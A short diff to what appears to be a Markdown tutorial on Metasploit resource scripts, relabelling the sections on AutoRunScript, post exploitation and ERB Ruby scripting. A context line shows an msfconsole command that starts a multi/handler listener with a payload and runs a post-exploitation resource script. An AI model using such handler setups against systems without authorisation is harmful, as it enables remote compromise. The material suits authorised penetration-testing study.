@@ -99,6 +99,8 @@
 
 ## Run RC through AutoRunScript
 
+- **metasploit prompt::**`[metasploit prompt]`<br />
+
       set AutoRunScript /root/my_resource_file.rc
 
 <br />
@@ -111,7 +113,7 @@
 
 ## POST EXPLOITATION
 
-- **AutoRunScript**
+- **AutoRunScript::**`[resource_script.rc]`<br />
 
       sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_command -rc $IPATH/aux/$P0; exploit'
 
@@ -126,7 +128,7 @@
 ## ERB SCRIPTING (ruby)
 <blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br /><br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple core or meterpreter commands together with ruby syntax (api).</blockquote>
 
-- **erb scripting**
+- **ERB scripting (ruby)::**`[resource_script.rc]`<br />
 
       <ruby>
       framework.db.hosts.each do |h|
